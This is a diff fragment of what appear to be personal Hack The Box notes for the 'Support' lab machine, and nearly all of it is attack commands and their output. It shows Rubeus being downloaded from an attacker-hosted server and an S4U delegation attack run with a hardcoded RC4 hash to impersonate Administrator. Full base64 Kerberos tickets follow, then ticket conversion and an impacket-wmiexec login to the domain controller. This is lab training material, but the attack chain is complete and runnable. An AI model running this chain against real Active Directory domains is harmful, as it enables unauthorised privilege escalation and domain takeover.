-		  r27wcFki+B28AdWXekyEArIGRbrVBeI0NcdaFr2GSLh8b10SUU39nz7FrZIMxLEnHkPpY4erEUbWH85C
-		  1eRQ+HZ2/+pPmSRmIIvhVAG3lL55H+FFVtmYPSklRABX7i/paPJdKFxNrI79Y/UrRL2O94x5iYFXnEqV
-		  OfzPStLq9xsThaDoruYsjl+Y2AKzpQc3oKSgirAl+SMaPeIOIx2k99WA8fbarbKVESl91D4nnkjHwyEM
-		  kaxHwjccRoc23t6/sK4vzEo6oAoJeYDsHd6Z59ZLrOahhkvlyrxvD7EHAeWGq/B/P0TJe9DnsiwWug5/
-		  vZD2lkTVNjxLdeT1UF1zrIDe1JHHJNFX7gPNTbPLRWajcA2lwUEy8/ambZT6+I+9SCMqkt/4Kv7L+YE3
-		  eeoyuapKDtjAUjZkLj2Q0GiRj0yt++OonohePQmsDDSJa4zxc8eaNAKpF8TAe0BSSUXfCwze4hYlPLAS
-		  e31+T0bMwp9OJtjyOsomXgBWF9mJfTEJgZZTcbQEznr1hHykyLXnkadkjTRPWZ7W6is0iOO6GUvSDAiU
-		  2YTCHVa6FY2KvJX9mWk6YhpXqwvA2MeATEQ4+9l3iYmELhqkOXQTqdImYdBMNrr7sf6e9wyx5fGl6tq6
-		  2IyFJh7YH7frcGjuhyileRBraVpyXsF4ySuVdRf1QWOsNhwc0a2wgoDDoYa3ZQv5uK9Ap8lNJsR22+5X
-		  Bj8+zWIay8CrQ8P0wRaxjgXz9l5b3Bh9Ng/iLHXqnaK9qR2DBkCOwCmb3HrHO0d1JJw+cvXyyGmq0d7b
-		  UKpmZqmwwU9IqI3g+vyFf4g1vTLjjBqBbUEWbLc4QEXm2QXlzcQgWgp020RGBPJbShhSsfGrPuzqJuf9
-		  hMCGT52NgLPgR/ZSPMZlR8o7pDEDAevxZEVWCy9L2yUYIvPc506S289fi4m7q+GWiDFaIKOB2TCB1qAD
-		  AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEEBPxHUWqadeM6GmWwo3dzDWhDRsLU1VQ
-		  UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjIxMTA5MTAz
-		  MjQ5WqYRGA8yMDIyMTEwOTIwMzI0OVqnERgPMjAyMjExMTYxMDMyNDlaqA0bC1NVUFBPUlQuSFRCqSEw
-		  H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=
-	[+] Ticket successfully imported!
+		Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.exe -OutFile Rubeus.exe
+		Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.exe.config -OutFile Rubeus.exe.config
+		Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.pdb -OutFile Rubeus.pdb
 
 
-	[IO.File]::WriteAllBytes("C:\Users\support\Documents\ticket.kirbi", [Convert]::FromBase64String("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"))
+		.\Rubeus.exe s4u /user:FakeComputer01$ /rc4:A8061F769DDD61A1A517FB6EFC3F1D8A /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
 
-	download ticket.kirbi
 
-	------------------------------------------------------------------------------------------------------------------------------------------
-	10.10.11.174 dc.support.htb support.htb
+		   ______        _
+		  (_____ \      | |
+		   _____) )_   _| |__  _____ _   _  ___
+		  |  __  /| | | |  _ \| ___ | | | |/___)
+		  | |  \ \| |_| | |_) ) ____| |_| |___ |
+		  |_|   |_|____/|____/|_____)____/(___/
 
-	python3 ticket_converter.py ticket.kirbi ticket.ccache
-	export KRB5CCNAME=ticket.ccache
-	impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
-	
+		  v2.2.0
+
+		[*] Action: S4U
+
+		[*] Using rc4_hmac hash: A8061F769DDD61A1A517FB6EFC3F1D8A
+		[*] Building AS-REQ (w/ preauth) for: 'support.htb\FakeComputer01$'
+		[*] Using domain controller: ::1:88
+		[+] TGT request successful!
+		[*] base64(ticket.kirbi):
+
+			  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
+			  cnQuaHRi
+
+
+		[*] Action: S4U
+
+		[*] Building S4U2self request for: 'FakeComputer01$@SUPPORT.HTB'
+		[*] Using domain controller: dc.support.htb (::1)
+		[*] Sending S4U2self request to ::1:88
+		[+] S4U2self success!
+		[*] Got a TGS for 'administrator' to 'FakeComputer01$@SUPPORT.HTB'
+		[*] base64(ticket.kirbi):
+
+			  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
+			  AaETMBEbD0Zha2VDb21wdXRlcjAxJA==
+
+		[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
+		[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+		[*] Using domain controller: dc.support.htb (::1)
+		[*] Sending S4U2proxy request to domain controller ::1:88
+		[+] S4U2proxy success!
+		[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+			  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
+		[+] Ticket successfully imported!
+
+
+		[IO.File]::WriteAllBytes("C:\Users\support\Documents\ticket.kirbi", [Convert]::FromBase64String("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"))
+
+		download ticket.kirbi
+
+		------------------------------------------------------------------------------------------------------------------------------------------
+		10.10.11.174 dc.support.htb support.htb
+
+		python3 ticket_converter.py ticket.kirbi ticket.ccache
+		export KRB5CCNAME=ticket.ccache
+		impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
+		
 	
